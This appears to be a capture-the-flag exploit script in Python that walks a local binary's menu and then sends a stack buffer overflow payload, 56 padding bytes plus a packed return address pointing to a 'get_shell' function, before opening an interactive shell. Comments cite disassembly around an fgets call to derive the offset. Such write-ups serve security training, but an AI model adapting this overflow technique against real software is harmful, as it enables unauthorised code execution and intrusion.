import interact
import struct

def p64(n):
    return struct.pack('Q', n)

p = interact.Process()

print(p.readuntil('use:'))
p.sendline('4')

print(p.readuntil('first name:'))
p.sendline('A'*30) 
print(p.readuntil('last name:'))
p.sendline('B'*30)

print(p.readuntil('Scrambling? [y/n]'))
p.sendline('a')

print(p.readuntil('hashes? [y/n]'))
p.sendline('y')

print(p.readuntil('first name:'))
p.sendline('C'*29)   
print(p.readuntil('last name:'))
p.sendline('D'*30)   

print(p.readuntil('Scrambling? [y/n]'))
p.sendline('y')

print(p.readuntil('use:'))

get_shell_addr = 0x400b21 

# 0x400bcf:  mov     rdx, qword [rel stdin]
# 0x400bd6:  mov     eax, dword [rel data_602160]
# 0x400bdc:  mov     ecx, eax
# 0x400bde:  lea     rax, [rbp-0x30]
# 0x400be2:  mov     esi, ecx
# 0x400be4:  mov     rdi, rax
# 0x400be7:  call    fgets
# So user_pin is located at 48+8 = 56 bytes from the return address
payload = 'A'*56 + p64(get_shell_addr)

p.sendline(payload)

p.interactive()
